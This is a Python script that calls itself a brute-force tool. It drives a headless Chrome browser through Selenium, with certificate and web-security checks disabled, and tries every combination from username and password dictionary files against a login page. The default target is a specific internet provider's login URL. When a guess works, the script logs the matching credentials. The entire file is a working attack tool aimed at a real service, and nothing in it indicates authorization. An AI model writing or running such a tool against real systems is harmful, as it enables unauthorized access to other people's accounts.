import os
import logging
import argparse
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException

# Setup logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

def get_available_directories():
    """Retrieve available subdirectories in the 'Dictionary' folder."""
    script_dir = os.path.dirname(os.path.abspath(__file__))
    dictionary_path = os.path.join(script_dir, "Dictionary")

    if not os.path.exists(dictionary_path):
        logging.error("Error: 'Dictionary' directory does not exist!")
        return {}

    directories = {
        str(index + 1): name for index, name in enumerate(sorted(os.listdir(dictionary_path)))
        if os.path.isdir(os.path.join(dictionary_path, name))
    }

    return directories

def get_file_paths(selected_dir):
    """Get the correct file paths based on user selection."""
    script_dir = os.path.dirname(os.path.abspath(__file__))
    dictionary_path = os.path.join(script_dir, "Dictionary", selected_dir)

    return {
        "prefix": os.path.join(script_dir, "Dictionary", "prefix.txt"),
        "username": os.path.join(dictionary_path, "username.txt"),
        "password": os.path.join(dictionary_path, "password.txt"),
    }

def load_basic_credentials(selected_dir):
    """Load usernames and passwords from the selected directory."""
    paths = get_file_paths(selected_dir)

    if not os.path.exists(paths["username"]) or not os.path.exists(paths["password"]) or not os.path.exists(paths["prefix"]):
        logging.error(f"Error: Missing username.txt, password.txt, or prefix.txt in {selected_dir}")
        return [], []

    with open(paths["prefix"], "r", encoding="utf-8") as pf:
        prefix = pf.read().strip()

    with open(paths["username"], "r", encoding="utf-8") as uf:
        usernames = [prefix + line.strip() for line in uf if line.strip()]

    with open(paths["password"], "r", encoding="utf-8") as pf:
        passwords = [line.strip() for line in pf if line.strip()]

    return usernames, passwords

def load_advanced_credentials(selected_dir):
    """Load usernames from the selected directory and passwords from all other directories."""
    script_dir = os.path.dirname(os.path.abspath(__file__))
    dictionary_path = os.path.join(script_dir, "Dictionary")

    username_path = os.path.join(dictionary_path, selected_dir, "username.txt")
    prefix_path = os.path.join(dictionary_path, "prefix.txt")

    if not os.path.exists(username_path) or not os.path.exists(prefix_path):
        logging.error(f"Error: Missing username.txt or prefix.txt in {selected_dir}")
        return [], []

    with open(prefix_path, "r", encoding="utf-8") as pf:
        prefix = pf.read().strip()

    with open(username_path, "r", encoding="utf-8") as uf:
        usernames = [prefix + line.strip() for line in uf if line.strip()]

    passwords = []
    for dir_name in os.listdir(dictionary_path):
        dir_path = os.path.join(dictionary_path, dir_name)
        if os.path.isdir(dir_path) and dir_name != selected_dir:
            password_path = os.path.join(dir_path, "password.txt")
            if os.path.exists(password_path):
                with open(password_path, "r", encoding="utf-8") as pf:
                    passwords.extend([line.strip() for line in pf if line.strip()])

    return usernames, passwords

def execute_level():
    """Prompt user to select an execution level and directory."""
    dir_names = get_available_directories()
    if not dir_names:
        logging.error("No directories found inside 'Dictionary'. Exiting.")
        return

    print("\nAvailable Dictionary Directories:")
    for key, value in dir_names.items():
        print(f"{key}: {value}")

    choice = input("\nSelect a directory (Enter number): ").strip()
    if choice not in dir_names:
        logging.error("Invalid directory choice. Exiting.")
        return

    selected_dir = dir_names[choice]

    print("\nSelect Execution Level:")
    print("1: Basic Level (Usernames and Passwords from the same directory)")
    print("2: Advanced Level (Usernames from selected directory, passwords from other directories)")
    level = input("Enter level (1 or 2): ").strip()

    if level == "1":
        logging.info("Executing Basic Level...")
        usernames, passwords = load_basic_credentials(selected_dir)
    elif level == "2":
        logging.info("Executing Advanced Level...")
        usernames, passwords = load_advanced_credentials(selected_dir)
    else:
        logging.error("Invalid execution level. Exiting.")
        return

    if not usernames or not passwords:
        logging.error("No usernames or passwords loaded. Exiting...")
        return

    start_webdriver(usernames, passwords)

def start_webdriver(usernames, passwords):
    """Initialize WebDriver and perform login attempts."""
    parser = argparse.ArgumentParser(description="AIT Brute Force Tool")
    parser.add_argument("--login_url", type=str, default="http://urbanlink.net.ph/urban/urbanlogin.html", help="Custom login URL")
    parser.add_argument("--wrong_url", type=str, default="http://urbanlink.net.ph/urban/login", help="Wrong login redirect URL")
    args = parser.parse_args()

    chrome_options = webdriver.ChromeOptions()
    chrome_options.add_argument("--ignore-ssl-errors")
    chrome_options.add_argument("--allow-insecure-localhost")
    chrome_options.add_argument("--disable-web-security")
    chrome_options.add_argument("--ignore-certificate-errors")
    chrome_options.add_argument("--disable-features=NetworkService,VizDisplayCompositor")
    chrome_options.add_argument("--headless")  # Run in headless mode

    try:
        with webdriver.Chrome(options=chrome_options) as driver:
            wait = WebDriverWait(driver, 3)
            driver.get(args.login_url)

            for username in usernames:
                for password in passwords:
                    try:
                        if driver.current_url == args.wrong_url:
                            logging.warning("Redirected to wrong login page. Retrying...")
                            driver.get(args.login_url)

                        user_input = wait.until(EC.presence_of_element_located((By.NAME, "username")))
                        pass_input = driver.find_element(By.NAME, "password")

                        user_input.clear()
                        pass_input.clear()
                        user_input.send_keys(username)
                        pass_input.send_keys(password)
                        pass_input.send_keys(Keys.RETURN)

                        wait.until(lambda d: d.current_url != args.login_url)
                        logging.info(f"Trying: {username} / {password} -> {driver.current_url}")

                        if any(keyword in driver.current_url for keyword in ["dashboard", "success_page", "status"]):
                            logging.info(f"✅ Success! Username: {username}, Password: {password} - Redirected to status page")
                            return

                        success_indicator = driver.find_elements(By.XPATH, "//div[contains(translate(text(), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'welcome')]")
                        if success_indicator:
                            logging.info(f"✅ Success! Username: {username}, Password: {password}")
                            driver.quit()
                            return

                        logging.info(f"❌ Failed: {username} / {password}")

                    except TimeoutException:
                        logging.error(f"⏳ Timeout waiting for elements. Retrying login for {username}/{password}...")
                        driver.quit()
                        return
                    except NoSuchElementException:
                        logging.error(f"⚠️ Login form not found. Skipping {username}/{password}...")
                        driver.quit()
                        return
                    except Exception as e:
                        logging.error(f"🚨 Unexpected error: {e}")
                        driver.quit()
                        return
            driver.quit()
            logging.info("❌ No valid credentials found.")

    except Exception as e:
        logging.error(f"🚨 WebDriver error: {e}")

if __name__ == "__main__":
    execute_level()
